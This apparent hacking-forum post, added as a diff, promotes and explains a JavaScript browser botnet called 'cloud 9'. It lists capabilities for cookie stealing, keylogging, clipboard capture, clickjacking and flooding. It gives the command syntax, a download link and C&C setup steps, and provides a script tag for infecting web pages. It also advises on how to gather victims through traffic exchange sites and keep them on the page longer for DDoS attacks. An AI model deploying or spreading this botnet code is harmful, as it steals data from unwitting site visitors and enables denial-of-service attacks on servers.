@@ -1,0 +1,65 @@
+How to infect a page with cloud 9 botnet:-
+
+<script src="http://yourserver.com/campaign.js"></script>
+
+
+
+
+
+
+
+
+
+Hello again HF!
+
+I created a javascript botnet that has the following features:
+FTP flood
+Cookie stealing
+Keylogging
+Send POST requests
+Flood POST requests
+Evaluate JavaScript Code
+Silently load webpages
+Clickjacking (iframe follow mouse)
+
+The commands are:
+Code 
+cookie
+clipboard
+load*[url]*[millisecond delay]*
+view*[url]*
+sleep*[milliseconds]*
+eval*[code]*
+jack*[iframe]*[width]*[height]*
+md5*[hash]*[brute length]*[brute alphabet]*
+sha1*[hash]*[brute length]*[brute alphabet]*
+post*[url]*[params]*
+floodpost*[url]*[params]*[millisecond delay]*
+The millisecond delay is the delay between requests when flooding.
+
+Here is the download link to the botnet:
+http :// browsersecurity.gq/cloud9-latest.zip
+
+Unzip the folder on you server
+Then edit campaign.js and set master to your servers IP
+Edit admin/panel4829.php and set a new username and password for the cnc panel
+
+One way of getting tons of browsers on your net use traffic exchange sites like hitleap.com or 10khits.com
+
+To FTP flood use this command:
+Code 
+load*ftp://website.com:80/*0*
+That command will exhaust all of the connections on a webserver with only a few browsers
+
+All keylogs that are recorded are sent once the page is closed for stealth
+
+To infect a page simply put this html on it:
+http ://pastebin .com/eDRgnxN9
+
+Then whoever visits the page will be on the botnet for as long as they are on the page.
+
+I suggest putting a movie on the page so people will stay on the botnet for longer. (Good for ddos attacks)
+
+Happy hacking! 
+
+https://hackforums.net/showthread.php?tid=5473222
